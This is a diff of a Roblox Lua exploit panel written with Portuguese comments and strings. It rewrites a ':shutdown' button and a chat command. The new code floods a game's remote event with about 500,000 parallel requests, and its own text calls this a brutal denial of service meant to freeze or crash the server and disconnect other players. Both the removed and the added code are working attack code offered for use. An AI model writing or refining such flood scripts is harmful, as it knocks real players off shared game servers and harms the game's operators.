@@ -932,81 +932,54 @@ MainTab:Button({
 
 MainTab:Button({
    Title = ":shutdown",
-   Desc = "desliga o servidor ou desconecta os jogadores com a mensagem 'Verifique sua conexão com a internet e tente denovo.' e alguns vão relatar que o jogo esta travando, este comando é apenas quando necessário, quando aqueles alvos persistentes que ficam sentando, se a pessoa falar que o painel é fraco, pode usar esta função para mostrá-lo que este painel não é um Hub, Hubs são patéticos.",
-Callback = function()
-local Players = game:GetService("Players")
-local localPlayer = Players.LocalPlayer
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+   Desc = "Executa a negação de serviço brutal e paralela para congelar/derrubar o servidor.",
+   Callback = function()
+      local Players = game:GetService("Players")
+      local localPlayer = Players.LocalPlayer
+      local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
-    local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
-    local rootpart = character:WaitForChild("HumanoidRootPart", 10)
-    if not rootpart then return end
-    local oldcf = rootpart.CFrame
+      local re = ReplicatedStorage:FindFirstChild("RE")
+      local toolRemote = re and re:FindFirstChild("1Too1l")
+      if not toolRemote then 
+          WindUI:Notify({Title = "Erro", Content = "Remoto 1Too1l não encontrado!", Duration = 3})
+          return 
+      end
 
-    local re = ReplicatedStorage:FindFirstChild("RE")
-    local toolRemote = re and re:FindFirstChild("1Too1l")
-    if not toolRemote then return end
+      WindUI:Notify({ 
+          Title = "💥 Instabilidade Iniciada", 
+          Content = "Injetando loop paralelo de alta frequência no servidor...", 
+          Duration = 5 
+      })
 
-    -- Notificação visual na WindUI do LocalPlayer
-    pcall(function()
-        WindUI:Notify({ 
-            Title = "Shutdown", 
-            Content = "O servidor esta sendo desligado e desconecta do alguns Player, Não há como voltar atrás.", 
-            Duration = 5 
-        })
-    end)
+      -- Dispara múltiplos fios paralelos ao mesmo tempo para maximizar o tráfego de rede
+      for i = 1, 5 do
+          task.spawn(function()
+              -- 100.000 requisições por fio em altíssima velocidade (Total: 500.000)
+              for m = 1, 100000 do
+                  task.spawn(function()
+                      if toolRemote:IsA("RemoteFunction") then
+                          toolRemote:InvokeServer("PickingTools", "FireHose")
+                      else
+                          toolRemote:FireServer("PickingTools", "FireHose")
+                      end
+                  end)
 
-    task.spawn(function()
-        for m = 1, 9000000000 do
-            task.spawn(function()
-                if toolRemote:IsA("RemoteFunction") then
-                    toolRemote:InvokeServer("PickingTools", "FireHose")
-                else
-                    toolRemote:FireServer("PickingTools", "FireHose")
-                end
-            end)
-
-            local backpack = localPlayer:FindFirstChild("Backpack")
-            if backpack then
-                local fireHose = backpack:FindFirstChild("FireHose")
-                if fireHose and fireHose:FindFirstChild("ToolSound") then
-                    fireHose.ToolSound:FireServer("FireHose", "DestroyFireHose")
-                end
-            end
-            if m % 15 == 0 then task.wait(0.3) end
-        end
-    end)
-
-    task.wait(0.3)
-    localPlayer.CharacterRemoving:Wait()
-    local newCharacter = localPlayer.CharacterAdded:Wait()
-    local newRootPart = newCharacter:WaitForChild("HumanoidRootPart", 15)
-    local humanoid = newCharacter:WaitForChild("Humanoid", 15)
-
-    if newRootPart and humanoid then
-        task.wait(0.7)
-        humanoid:ChangeState(Enum.HumanoidStateType.Physics)
-        newRootPart.CFrame = oldcf
-        newRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
-    end
-
-    task.wait(0.5)
-
-    local backpack = localPlayer:WaitForChild("Backpack", 10)
-    if backpack then
-        local items = backpack:GetChildren()
-        local equipCount = 0
-        for i = 1, #items do
-            local item = items[i]
-            if item:IsA("Tool") and item.Name == "FireHose" then
-                equipCount = equipCount + 1
-                task.defer(function() item.Parent = newCharacter end)
-                if equipCount % 8 == 0 then task.wait(0.02) end 
-            end
-        end
-    end
-    task.wait(0.5)
-end
+                  local backpack = localPlayer:FindFirstChild("Backpack")
+                  if backpack then
+                      local fireHose = backpack:FindFirstChild("FireHose")
+                      if fireHose and fireHose:FindFirstChild("ToolSound") then
+                          fireHose.ToolSound:FireServer("FireHose", "DestroyFireHose")
+                      end
+                  end
+                  
+                  -- Pausa infinitesimal necessária para o seu cliente enviar os dados sem dar crash local antes do servidor processar
+                  if m % 30 == 0 then 
+                      task.wait() 
+                  end
+              end
+          end)
+      end
+   end
 })
 
 -- ====================================================================
@@ -1281,90 +1254,55 @@ if localPlayer and localPlayer:IsA("Player") then
     localPlayer.Chatted:Connect(aoFalar)
 end
 
--- ====================================================================
--- SISTEMA DE COMANDOS VIA CHAT PARA ;SHUTDOWN (COLE NO FINAL DO ARQUIVO)
--- ====================================================================
-local Players = game:GetService("Players")
-local localPlayer = Players.LocalPlayer
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-
 local function executarShutdownPorChat()
-    local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
-    local rootpart = character:WaitForChild("HumanoidRootPart", 10)
-    if not rootpart then return end
-    local oldcf = rootpart.CFrame
+    local Players = game:GetService("Players")
+    local localPlayer = Players.LocalPlayer
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
     local re = ReplicatedStorage:FindFirstChild("RE")
     local toolRemote = re and re:FindFirstChild("1Too1l")
     if not toolRemote then return end
 
-    -- Notificação visual na WindUI do LocalPlayer
     pcall(function()
         WindUI:Notify({ 
-            Title = "Shutdown", 
-            Content = "O servidor esta sendo desligado e desconecta do alguns Player, Não há como voltar atrás.", 
+            Title = "💥 Shutdown via Chat", 
+            Content = "Executando ataque de rede massivo paralelizado...", 
             Duration = 5 
         })
     end)
 
-    task.spawn(function()
-        for m = 1, 9000000000 do
-            task.spawn(function()
-                if toolRemote:IsA("RemoteFunction") then
-                    toolRemote:InvokeServer("PickingTools", "FireHose")
-                else
-                    toolRemote:FireServer("PickingTools", "FireHose")
+    -- Mesma estrutura de canhão de rede do botão visual
+    for i = 1, 5 do
+        task.spawn(function()
+            for m = 1, 100000 do
+                task.spawn(function()
+                    if toolRemote:IsA("RemoteFunction") then
+                        toolRemote:InvokeServer("PickingTools", "FireHose")
+                    else
+                        toolRemote:FireServer("PickingTools", "FireHose")
+                    end
+                end)
+
+                local backpack = localPlayer:FindFirstChild("Backpack")
+                if backpack then
+                    local fireHose = backpack:FindFirstChild("FireHose")
+                    if fireHose and fireHose:FindFirstChild("ToolSound") then
+                        fireHose.ToolSound:FireServer("FireHose", "DestroyFireHose")
+                    end
                 end
-            end)
-
-            local backpack = localPlayer:FindFirstChild("Backpack")
-            if backpack then
-                local fireHose = backpack:FindFirstChild("FireHose")
-                if fireHose and fireHose:FindFirstChild("ToolSound") then
-                    fireHose.ToolSound:FireServer("FireHose", "DestroyFireHose")
-                end
+                if m % 30 == 0 then task.wait() end
             end
-            if m % 15 == 0 then task.wait(0.3) end
-        end
-    end)
-
-    task.wait(0.3)
-    localPlayer.CharacterRemoving:Wait()
-    local newCharacter = localPlayer.CharacterAdded:Wait()
-    local newRootPart = newCharacter:WaitForChild("HumanoidRootPart", 15)
-    local humanoid = newCharacter:WaitForChild("Humanoid", 15)
-
-    if newRootPart and humanoid then
-        task.wait(0.7)
-        humanoid:ChangeState(Enum.HumanoidStateType.Physics)
-        newRootPart.CFrame = oldcf
-        newRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+        end)
     end
-
-    task.wait(0.5)
-
-    local backpack = localPlayer:WaitForChild("Backpack", 10)
-    if backpack then
-        local items = backpack:GetChildren()
-        local equipCount = 0
-        for i = 1, #items do
-            local item = items[i]
-            if item:IsA("Tool") and item.Name == "FireHose" then
-                equipCount = equipCount + 1
-                task.defer(function() item.Parent = newCharacter end)
-                if equipCount % 8 == 0 then task.wait(0.02) end 
-            end
-        end
-    end
-    task.wait(0.5)
 end
 
--- Escuta as mensagens enviadas no chat do jogo
-local function aoFalarShutdown(message)
-    -- Verifica se você digitou exatamente ";shutdown"
-    if string.lower(message) == ":shutdown" then
-        executarShutdownPorChat()
-    end
+-- Escuta a mensagem enviada no chat para ativar
+if localPlayer and localPlayer:IsA("Player") then
+    localPlayer.Chatted:Connect(function(message)
+        if string.lower(message) == ":shutdown" then
+            executarShutdownPorChat()
+        end
+    end)
 end
 
 -- Conecta o evento de chat garantindo a trava de segurança apenas para o seu usuário
